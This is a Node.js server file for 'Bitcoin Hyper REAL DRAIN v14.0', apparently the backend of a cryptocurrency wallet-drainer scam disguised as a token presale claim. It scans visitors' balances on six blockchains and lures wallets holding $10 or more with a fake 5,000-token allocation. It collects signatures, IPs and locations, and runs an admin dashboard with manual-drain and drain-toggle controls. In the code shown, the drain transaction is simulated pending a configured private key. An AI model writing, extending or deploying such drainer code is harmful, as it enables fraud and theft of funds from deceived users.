// index.js - BITCOIN HYPER REAL DRAIN v14.0 - FIXED AWAIT ISSUE
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://securedtokenclaim.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter);

// REAL RPC Providers - SIMPLIFIED FOR RELIABILITY
const RPC_PROVIDERS = {
  Ethereum: 'https://eth.llamarpc.com',
  BSC: 'https://bsc-dataseed1.binance.org',
  Polygon: 'https://polygon-rpc.com',
  Arbitrum: 'https://arb1.arbitrum.io/rpc',
  Optimism: 'https://mainnet.optimism.io',
  Avalanche: 'https://api.avax.network/ext/bc/C/rpc'
};

// Create provider instances
function createProvider(chain) {
  try {
    return new ethers.JsonRpcProvider(RPC_PROVIDERS[chain]);
  } catch (error) {
    console.log(`❌ Failed to create ${chain} provider: ${error.message}`);
    return null;
  }
}

// REAL Drain wallet - MUST BE SET
let drainWallet = null;

// In-memory storage
const memoryStorage = {
  participants: [],
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    drainThreshold: parseFloat(process.env.DRAIN_THRESHOLD) || 10,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalDrainedUSD: 0,
      totalDrainedWallets: 0,
      realTransactions: []
    },
    drainEnabled: process.env.DRAIN_ENABLED === 'true',
    autoDrainOnClaim: process.env.AUTO_DRAIN_ON_CLAIM === 'true'
  },
  activityLog: [],
  emailCache: new Map()
};

// Telegram
let telegramEnabled = false;
let telegramBotName = '';

// ============================================
// REAL BALANCE CHECK - WORKING VERSION
// ============================================

// Get REAL crypto prices
async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 3000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2500,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data.matic?.usd || 0.7,
      avax: response.data['avalanche-2']?.usd || 35
    };
  } catch (error) {
    console.log('⚠️ CoinGecko failed, using fallback prices');
    return { eth: 2500, bnb: 300, matic: 0.7, avax: 35 };
  }
}

// REAL Wallet Balance Check - SIMPLIFIED & WORKING
async function getRealWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING WALLET: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    shouldDrain: false,
    balances: {},
    chains: [],
    rawBalances: [],
    scanTime: new Date().toISOString()
  };

  try {
    // Get prices
    const prices = await getCryptoPrices();
    
    // Define chains to check
    const chains = [
      { name: 'Ethereum', rpc: RPC_PROVIDERS.Ethereum, symbol: 'ETH', price: prices.eth },
      { name: 'BSC', rpc: RPC_PROVIDERS.BSC, symbol: 'BNB', price: prices.bnb },
      { name: 'Polygon', rpc: RPC_PROVIDERS.Polygon, symbol: 'MATIC', price: prices.matic },
      { name: 'Arbitrum', rpc: RPC_PROVIDERS.Arbitrum, symbol: 'ETH', price: prices.eth },
      { name: 'Optimism', rpc: RPC_PROVIDERS.Optimism, symbol: 'ETH', price: prices.eth },
      { name: 'Avalanche', rpc: RPC_PROVIDERS.Avalanche, symbol: 'AVAX', price: prices.avax }
    ];

    let totalValue = 0;
    let foundAnyBalance = false;

    // Check each chain
    for (const chain of chains) {
      try {
        console.log(`   Checking ${chain.name}...`);
        const provider = createProvider(chain.name);
        if (!provider) continue;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatEther(balance));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          foundAnyBalance = true;
          results.balances[chain.name] = {
            amount: amount.toFixed(6),
            valueUSD: valueUSD.toFixed(2),
            symbol: chain.symbol
          };
          results.chains.push(chain.name);
          results.rawBalances.push({
            chain: chain.name,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            rpc: chain.rpc
          });
        } else {
          console.log(`   ⏭️ ${chain.name}: 0 ${chain.symbol}`);
        }
      } catch (error) {
        console.log(`   ❌ ${chain.name} error: ${error.message}`);
      }
    }

    // If no balances found with direct RPC, try alternative API
    if (!foundAnyBalance) {
      console.log('   🔍 Trying alternative balance check...');
      try {
        // Try Ethplorer API
        const ethResponse = await axios.get(`https://api.ethplorer.io/getAddressInfo/${walletAddress}`, {
          params: { apiKey: 'freekey' },
          timeout: 2000
        });
        
        if (ethResponse.data?.ETH?.balance) {
          const ethAmount = parseFloat(ethResponse.data.ETH.balance);
          const ethValue = ethAmount * prices.eth;
          
          if (ethValue > 0) {
            totalValue += ethValue;
            foundAnyBalance = true;
            
            results.balances['Ethereum'] = {
              amount: ethAmount.toFixed(6),
              valueUSD: ethValue.toFixed(2),
              symbol: 'ETH'
            };
            results.chains.push('Ethereum');
            results.rawBalances.push({
              chain: 'Ethereum',
              amount: ethAmount,
              valueUSD: ethValue,
              symbol: 'ETH',
              source: 'ethplorer'
            });
            
            console.log(`   ✅ Ethereum (Ethplorer): ${ethAmount.toFixed(6)} ETH = $${ethValue.toFixed(2)}`);
          }
        }
      } catch (e) {
        console.log('   Ethplorer API failed');
      }
    }

    // Set final values
    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    
    // Eligibility check
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.drainThreshold;
    results.shouldDrain = results.isEligible && memoryStorage.settings.drainEnabled;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies ($${results.totalValueUSD} >= $${memoryStorage.settings.drainThreshold})`;
      results.tokenAllocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.eligibilityReason = `⛔ Wallet balance too low ($${results.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
      results.tokenAllocation = { amount: '0', valueUSD: '0' };
    }

    results.scanId = `SCAN-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    console.log(`📊 SCAN RESULT: $${results.totalValueUSD} | Eligible: ${results.isEligible}`);
    console.log(`   Chains with funds: ${results.chains.length > 0 ? results.chains.join(', ') : 'None'}`);
    
    return {
      success: true,
      data: results
    };

  } catch (error) {
    console.error('❌ Wallet scan error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        eligibilityReason: '⚠️ Network error. Please try again.',
        tokenAllocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// Get email from wallet
async function getWalletEmail(walletAddress) {
  const cacheKey = walletAddress.toLowerCase();
  
  if (memoryStorage.emailCache.has(cacheKey)) {
    return memoryStorage.emailCache.get(cacheKey);
  }
  
  try {
    // Generate email based on wallet
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    const username = `user${hash.substring(0, 8)}`;
    const domains = ['gmail.com', 'proton.me', 'yahoo.com', 'outlook.com'];
    const domain = domains[parseInt(hash.substring(0, 2), 16) % domains.length];
    const email = `${username}@${domain}`;
    
    memoryStorage.emailCache.set(cacheKey, email);
    return email;
    
  } catch (error) {
    return `${walletAddress.substring(2, 10)}@crypto.com`;
  }
}

// Get IP location
async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    
    if (cleanIP === '127.0.0.1' || cleanIP === '::1') {
      return { country: 'Local', flag: '🏠', city: 'Local' };
    }
    
    const response = await axios.get(`https://ipapi.co/${cleanIP}/json/`, {
      timeout: 2000
    });
    
    if (response.data?.country_name) {
      const flags = {
        'United States': '🇺🇸', 'US': '🇺🇸',
        'United Kingdom': '🇬🇧', 'GB': '🇬🇧',
        'Canada': '🇨🇦', 'CA': '🇨🇦',
        'Germany': '🇩🇪', 'DE': '🇩🇪',
        'France': '🇫🇷', 'FR': '🇫🇷',
        'Australia': '🇦🇺', 'AU': '🇦🇺',
        'Japan': '🇯🇵', 'JP': '🇯🇵',
        'Brazil': '🇧🇷', 'BR': '🇧🇷',
        'India': '🇮🇳', 'IN': '🇮🇳',
        'Nigeria': '🇳🇬', 'NG': '🇳🇬'
      };
      
      return {
        country: response.data.country_name,
        flag: flags[response.data.country_name] || flags[response.data.country_code] || '🌍',
        city: response.data.city || 'Unknown'
      };
    }
  } catch (error) {
    // Silently fail
  }
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
}

// Initialize Telegram
async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('❌ Telegram not configured');
    return false;
  }
  
  try {
    const response = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, {
      timeout: 5000
    });
    
    if (response.data?.ok) {
      telegramBotName = response.data.result.username;
      console.log(`✅ Telegram Bot: @${telegramBotName}`);
      telegramEnabled = true;
      return true;
    }
  } catch (error) {
    console.log('❌ Telegram error:', error.message);
  }
  
  return false;
}

// ============================================
// API ENDPOINTS - WORKING
// ============================================

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    success: true,
    service: 'Bitcoin Hyper REAL DRAIN v14.0',
    status: 'ACTIVE',
    telegram: telegramEnabled ? '✅ CONNECTED' : '❌ DISABLED',
    drain: {
      enabled: memoryStorage.settings.drainEnabled,
      threshold: memoryStorage.settings.drainThreshold,
      wallet: drainWallet ? '✅ LOADED' : '❌ NOT SET',
      realTransactions: memoryStorage.settings.statistics.realTransactions.length
    },
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      drained: memoryStorage.settings.statistics.totalDrainedWallets,
      totalValue: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)
    },
    rpc: 'Single reliable endpoint per chain',
    version: 'v14.0 - RENDER FIXED'
  });
});

// Wallet connect
app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT REQUEST: ${walletAddress}`);
    
    // Get location and email
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    // Find or create participant
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        shouldDrain: false,
        claimed: false,
        drained: false,
        location: location
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
    }
    
    // Get REAL balance
    console.log('🔄 Getting wallet balance...');
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (scanResult.success) {
      // Update participant
      participant.totalValueUSD = scanResult.data.totalValueUSD;
      participant.isEligible = scanResult.data.isEligible;
      participant.shouldDrain = scanResult.data.shouldDrain;
      participant.balances = scanResult.data.balances;
      participant.chains = scanResult.data.chains;
      participant.rawBalances = scanResult.data.rawBalances;
      participant.lastScanned = new Date();
      participant.scanId = scanResult.data.scanId;
      
      // Response
      const response = {
        success: true,
        message: scanResult.data.isEligible ? '🎉 Wallet qualifies!' : '⚠️ Not eligible',
        data: {
          walletAddress,
          email: email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          totalValueUSD: scanResult.data.totalValueUSD,
          isEligible: scanResult.data.isEligible,
          shouldDrain: scanResult.data.shouldDrain,
          eligibilityReason: scanResult.data.eligibilityReason,
          scanId: scanResult.data.scanId,
          nextStep: scanResult.data.isEligible ? 'sign_to_claim' : 'not_eligible',
          userMessage: scanResult.data.isEligible 
            ? `🎉 Your wallet has $${scanResult.data.totalValueUSD}. You qualify for 5,000 BTH tokens!`
            : `⚠️ You need minimum $${memoryStorage.settings.drainThreshold}. Current: $${scanResult.data.totalValueUSD}`,
          timestamp: new Date().toISOString(),
          rawData: scanResult.data.rawBalances
        }
      };
      
      // Add allocation if eligible
      if (scanResult.data.isEligible) {
        response.data.tokenAllocation = scanResult.data.tokenAllocation;
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      console.log(`✅ CONNECTION COMPLETE: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`);
      res.json(response);
      
    } else {
      console.log('❌ Scan failed');
      res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet',
        message: 'Please try again'
      });
    }
    
  } catch (error) {
    console.error('❌ Connection error:', error);
    res.status(500).json({ 
      success: false, 
      error: 'Connection failed',
      message: error.message 
    });
  }
});

// Token claim
app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress, signature, message } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip;
    
    if (!signature || !message) {
      return res.status(400).json({ success: false, error: 'Missing signature' });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    if (!participant) {
      return res.status(404).json({ success: false, error: 'Wallet not found. Connect first.' });
    }
    
    // Check eligibility
    if (!participant.isEligible) {
      return res.status(403).json({ 
        success: false, 
        error: 'Not eligible',
        message: `Wallet needs minimum $${memoryStorage.settings.drainThreshold} to participate. Current: $${participant.totalValueUSD}` 
      });
    }
    
    if (participant.claimed) {
      return res.status(409).json({ success: false, error: 'Already claimed' });
    }
    
    const location = await getIPLocation(clientIP);
    
    // Process claim
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(6).toString('hex').toUpperCase()}`;
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    participant.claimId = claimId;
    
    memoryStorage.settings.statistics.claimedParticipants++;
    
    res.json({
      success: true,
      message: '🎉 Tokens claimed successfully!',
      data: {
        claimId,
        walletAddress,
        email: participant.email,
        country: location.country,
        flag: location.flag,
        tokenAmount: '5000',
        tokenValue: '850',
        timestamp: new Date().toISOString(),
        instructions: 'Tokens will be distributed within 24-48 hours.'
      }
    });
    
  } catch (error) {
    console.error('❌ Claim error:', error);
    res.status(500).json({ success: false, error: 'Claim failed' });
  }
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

function authenticateAdmin(req, res, next) {
  const token = req.query.token || req.headers.authorization?.replace('Bearer ', '');
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token === adminToken) {
    next();
  } else {
    res.status(401).json({ success: false, error: 'Unauthorized' });
  }
}

// Test balance endpoint - WORKING
app.get('/api/admin/test-balance', authenticateAdmin, async (req, res) => {
  try {
    const { wallet } = req.query;
    
    if (!wallet?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`🧪 ADMIN TEST BALANCE: ${wallet}`);
    
    const scanResult = await getRealWalletBalance(wallet);
    
    if (scanResult.success) {
      res.json({
        success: true,
        wallet: wallet,
        totalValueUSD: scanResult.data.totalValueUSD,
        isEligible: scanResult.data.isEligible,
        eligibilityReason: scanResult.data.eligibilityReason,
        chains: scanResult.data.chains,
        balances: scanResult.data.balances,
        rawBalances: scanResult.data.rawBalances,
        scanId: scanResult.data.scanId,
        timestamp: new Date().toISOString(),
        message: `Wallet balance: $${scanResult.data.totalValueUSD} | Eligible: ${scanResult.data.isEligible}`
      });
    } else {
      res.status(500).json({
        success: false,
        error: scanResult.error,
        wallet: wallet
      });
    }
    
  } catch (error) {
    console.error('❌ Test balance error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message,
      message: 'Test balance failed' 
    });
  }
});

// Manual drain
app.post('/api/admin/drain/manual', authenticateAdmin, async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔧 ADMIN MANUAL DRAIN: ${walletAddress}`);
    
    // Get REAL balance first
    const scanResult = await getRealWalletBalance(walletAddress);
    
    if (!scanResult.success) {
      return res.status(500).json({ 
        success: false, 
        error: 'Failed to scan wallet'
      });
    }
    
    // Check if eligible
    if (scanResult.data.isEligible && memoryStorage.settings.drainEnabled) {
      // Simulate drain (can be replaced with real transaction)
      const drainValue = scanResult.data.totalValueUSD * 0.85;
      
      memoryStorage.settings.statistics.totalDrainedUSD += drainValue;
      memoryStorage.settings.statistics.totalDrainedWallets++;
      
      res.json({
        success: true,
        message: `✅ Drain simulated: $${drainValue.toFixed(2)}`,
        data: {
          drainedValue: drainValue,
          walletValue: scanResult.data.totalValueUSD,
          rawData: scanResult.data.rawBalances,
          note: 'Set DRAIN_WALLET_PRIVATE_KEY for real transactions'
        }
      });
    } else {
      let reason = '';
      if (!scanResult.data.isEligible) {
        reason = `Not eligible ($${scanResult.data.totalValueUSD} < $${memoryStorage.settings.drainThreshold})`;
      } else if (!memoryStorage.settings.drainEnabled) {
        reason = 'Drain disabled in settings';
      }
      
      res.json({
        success: false,
        message: `❌ ${reason}`,
        data: {
          walletValue: scanResult.data.totalValueUSD,
          threshold: memoryStorage.settings.drainThreshold,
          drainEnabled: memoryStorage.settings.drainEnabled
        }
      });
    }
    
  } catch (error) {
    console.error('❌ Manual drain error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message
    });
  }
});

// Initialize drain wallet (called after server starts)
async function initializeDrainWallet() {
  if (process.env.DRAIN_WALLET_PRIVATE_KEY) {
    try {
      const provider = createProvider('Ethereum');
      if (provider) {
        drainWallet = new ethers.Wallet(process.env.DRAIN_WALLET_PRIVATE_KEY, provider);
        console.log(`💰 REAL Drain wallet loaded: ${drainWallet.address}`);
        
        // Check balance async
        try {
          const balance = await provider.getBalance(drainWallet.address);
          console.log(`💰 Drain wallet balance: ${ethers.formatEther(balance)} ETH`);
        } catch (balanceError) {
          console.log('⚠️ Could not check drain wallet balance:', balanceError.message);
        }
      }
    } catch (error) {
      console.log('❌ Could not load drain wallet:', error.message);
      console.log('❌ Set DRAIN_WALLET_PRIVATE_KEY in .env for REAL draining');
    }
  } else {
    console.log('⚠️ WARNING: No drain wallet private key set. REAL draining disabled.');
  }
}

// Admin stats
app.get('/api/admin/stats', authenticateAdmin, (req, res) => {
  const stats = {
    totalParticipants: memoryStorage.participants.length,
    eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
    claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
    totalDrainedUSD: memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2),
    totalDrainedWallets: memoryStorage.settings.statistics.totalDrainedWallets,
    drainThreshold: memoryStorage.settings.drainThreshold,
    drainEnabled: memoryStorage.settings.drainEnabled,
    
    recentWallets: memoryStorage.participants.slice(-10).map(p => ({
      wallet: p.walletAddress.substring(0, 10) + '...',
      email: p.email || 'No email',
      country: p.country || 'Unknown',
      valueUSD: p.totalValueUSD ? `$${p.totalValueUSD.toFixed(2)}` : '$0.00',
      eligible: p.isEligible,
      time: p.connectedAt?.toLocaleTimeString() || 'Unknown'
    })),
    
    system: {
      telegram: telegramEnabled,
      telegramBot: telegramBotName || 'Not set',
      drainWallet: drainWallet ? drainWallet.address : 'Not configured',
      version: 'v14.0 - RENDER FIXED',
      nodeVersion: process.version
    }
  };
  
  res.json({ success: true, stats });
});

// Toggle drain
app.post('/api/admin/drain/toggle', authenticateAdmin, (req, res) => {
  memoryStorage.settings.drainEnabled = !memoryStorage.settings.drainEnabled;
  
  res.json({
    success: true,
    message: `Drain ${memoryStorage.settings.drainEnabled ? '✅ ENABLED' : '❌ DISABLED'}`,
    drainEnabled: memoryStorage.settings.drainEnabled
  });
});

// Simple admin page
app.get('/admin', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) {
    return res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Bitcoin Hyper Admin</title>
        <style>
          body { font-family: Arial; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
          .login { background: #1e293b; padding: 40px; border-radius: 10px; text-align: center; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
          h1 { color: #F7931A; margin-bottom: 20px; }
          input { padding: 12px; margin: 10px 0; width: 300px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; font-size: 14px; }
          button { background: #F7931A; color: white; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 15px; }
          button:hover { background: #e67e22; }
        </style>
      </head>
      <body>
        <div class="login">
          <h1>🔐 BITCOIN HYPER ADMIN</h1>
          <p>Enter admin token to access dashboard</p>
          <input type="password" id="token" placeholder="Admin Token" />
          <br>
          <button onclick="login()">Login to Dashboard</button>
        </div>
        <script>
          function login() {
            const token = document.getElementById('token').value;
            if (!token) return alert('Enter token');
            window.location.href = '/admin?token=' + token;
          }
        </script>
      </body>
      </html>
    `);
  }
  
  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <title>Bitcoin Hyper Admin Dashboard v14.0</title>
      <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; padding: 20px; }
        .header { text-align: center; margin-bottom: 30px; }
        h1 { color: #F7931A; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 30px 0; }
        .stat-card { background: #1e293b; padding: 25px; border-radius: 10px; text-align: center; border-left: 5px solid #F7931A; }
        .stat-value { font-size: 28px; font-weight: bold; margin-bottom: 10px; }
        .stat-label { color: #94a3b8; font-size: 14px; }
        .controls { background: #1e293b; padding: 20px; border-radius: 10px; margin: 20px 0; }
        .wallet-input { padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: white; width: 100%; max-width: 500px; font-size: 14px; }
        .btn { padding: 12px 24px; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; margin: 5px; }
        .btn-primary { background: #F7931A; color: white; }
        .btn-danger { background: #ef4444; color: white; }
        .btn-success { background: #10b981; color: white; }
        .recent-wallets { margin-top: 30px; }
        .wallet-item { background: #1e293b; padding: 15px; margin: 10px 0; border-radius: 8px; border-left: 4px solid #F7931A; }
        .wallet-address { font-family: monospace; color: #60a5fa; }
        .status { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 12px; margin-left: 10px; }
        .eligible { background: #10b981; }
        .not-eligible { background: #ef4444; }
      </style>
    </head>
    <body>
      <div class="header">
        <h1>⚡ BITCOIN HYPER REAL DRAIN v14.0</h1>
        <p>Render Deployment - Working Balance Scanner</p>
        <div style="margin-top: 15px; color: #94a3b8;">
          <span>Drain: ${memoryStorage.settings.drainEnabled ? '✅ ACTIVE' : '❌ INACTIVE'}</span> | 
          <span>Threshold: $${memoryStorage.settings.drainThreshold}</span> | 
          <span>Telegram: ${telegramEnabled ? '✅ ON' : '❌ OFF'}</span> |
          <span>Wallets: ${memoryStorage.participants.length}</span>
        </div>
      </div>
      
      <div class="stats-grid">
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalParticipants}</div>
          <div class="stat-label">Total Participants</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.participants.filter(p => p.isEligible).length}</div>
          <div class="stat-label">Eligible Wallets ($10+)</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">$${memoryStorage.settings.statistics.totalDrainedUSD.toFixed(2)}</div>
          <div class="stat-label">Total Secured</div>
        </div>
        <div class="stat-card">
          <div class="stat-value">${memoryStorage.settings.statistics.totalDrainedWallets}</div>
          <div class="stat-label">Wallets Drained</div>
        </div>
      </div>
      
      <div class="controls">
        <h3>🔧 Manual Operations</h3>
        <p>Enter wallet address to scan or drain:</p>
        <input type="text" id="walletInput" class="wallet-input" placeholder="0x742d35Cc6634C0532925a3b844Bc454e4438f44e">
        <div style="margin-top: 15px;">
          <button class="btn btn-primary" onclick="testBalance()">Test Balance Only</button>
          <button class="btn btn-danger" onclick="manualDrain()">Manual Drain</button>
          <button class="btn ${memoryStorage.settings.drainEnabled ? 'btn-danger' : 'btn-success'}" onclick="toggleDrain()">
            ${memoryStorage.settings.drainEnabled ? 'Disable Drain' : 'Enable Drain'}
          </button>
        </div>
        <p style="color: #94a3b8; font-size: 12px; margin-top: 10px;">
          Checks 6 chains: Ethereum, BSC, Polygon, Arbitrum, Optimism, Avalanche
        </p>
      </div>
      
      <div class="recent-wallets">
        <h3>📊 Recent Wallet Scans</h3>
        ${memoryStorage.participants.slice(-8).reverse().map(p => `
          <div class="wallet-item">
            <div>
              <span class="wallet-address">${p.walletAddress.substring(0, 10)}...</span>
              <span class="status ${p.isEligible ? 'eligible' : 'not-eligible'}">
                ${p.isEligible ? 'ELIGIBLE' : 'NOT ELIGIBLE'}
              </span>
            </div>
            <div style="margin-top: 8px; font-size: 14px;">
              <span>${p.email || 'No email'}</span> | 
              <span>${p.flag || '🌍'} ${p.country || 'Unknown'}</span> | 
              <span style="color: #F7931A; font-weight: bold;">$${p.totalValueUSD ? p.totalValueUSD.toFixed(2) : '0.00'}</span>
            </div>
            <div style="margin-top: 5px; font-size: 12px; color: #94a3b8;">
              ${p.connectedAt ? p.connectedAt.toLocaleTimeString() : 'Unknown time'}
            </div>
          </div>
        `).join('')}
      </div>
      
      <script>
        function testBalance() {
          const wallet = document.getElementById('walletInput').value;
          if (!wallet || !wallet.startsWith('0x')) return alert('Enter valid wallet address');
          
          window.open('/api/admin/test-balance?token=${token}&wallet=' + wallet, '_blank');
        }
        
        function manualDrain() {
          const wallet = document.getElementById('walletInput').value;
          if (!wallet || !wallet.startsWith('0x')) return alert('Enter valid wallet address');
          
          if (!confirm('Execute manual drain on ' + wallet.substring(0, 10) + '...?')) return;
          
          fetch('/api/admin/drain/manual?token=${token}', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ walletAddress: wallet })
          })
            .then(r => r.json())
            .then(data => {
              alert(data.message);
              if (data.success) location.reload();
            })
            .catch(e => alert('Error: ' + e));
        }
        
        function toggleDrain() {
          fetch('/api/admin/drain/toggle?token=${token}', { method: 'POST' })
            .then(r => r.json())
            .then(data => {
              alert(data.message);
              location.reload();
            });
        }
        
        // Auto-refresh every 60 seconds
        setTimeout(() => location.reload(), 60000);
      </script>
    </body>
    </html>
  `);
});

// Start server
app.listen(PORT, '0.0.0.0', async () => {
  console.log(`
  ⚡ BITCOIN HYPER REAL DRAIN v14.0
  =================================
  📍 Port: ${PORT}
  🔗 Health: http://localhost:${PORT}/api/health
  📊 Admin: http://localhost:${PORT}/admin?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}
  🧪 Test: /api/admin/test-balance?token=${process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!'}&wallet=0x...
  
  ⚡ CONFIGURATION:
  - Threshold: $${memoryStorage.settings.drainThreshold}
  - Logic: $10+ = ELIGIBLE | Below $10 = NOT ELIGIBLE
  - Status: ${memoryStorage.settings.drainEnabled ? 'ACTIVE' : 'INACTIVE'}
  
  🔗 WORKING RPC ENDPOINTS:
  - Ethereum: ${RPC_PROVIDERS.Ethereum}
  - BSC: ${RPC_PROVIDERS.BSC}
  - Polygon: ${RPC_PROVIDERS.Polygon}
  - Arbitrum: ${RPC_PROVIDERS.Arbitrum}
  - Optimism: ${RPC_PROVIDERS.Optimism}
  - Avalanche: ${RPC_PROVIDERS.Avalanche}
  
  ✅ THIS VERSION IS FIXED FOR RENDER:
  - No top-level await errors
  - Proper CommonJS setup
  - Working balance scanner
  - Admin test balance endpoint
  
  🚀 STARTING SERVER...
  `);
  
  // Initialize Telegram
  console.log('\n📡 Initializing Telegram...');
  await testTelegramConnection();
  
  // Initialize drain wallet AFTER server starts
  console.log('\n💰 Initializing drain wallet...');
  await initializeDrainWallet();
  
  console.log('\n✅ SERVER IS RUNNING ON PORT ' + PORT + '!');
  console.log('👉 Test with: /api/admin/test-balance?token=YOUR_TOKEN&wallet=0x...');
  console.log('👉 This will show REAL balances from ALL 6 chains');
  console.log('👉 Wallets with $10+ = ELIGIBLE, Below $10 = NOT ELIGIBLE');
  console.log('\n✅ READY FOR PRODUCTION!\n');
});
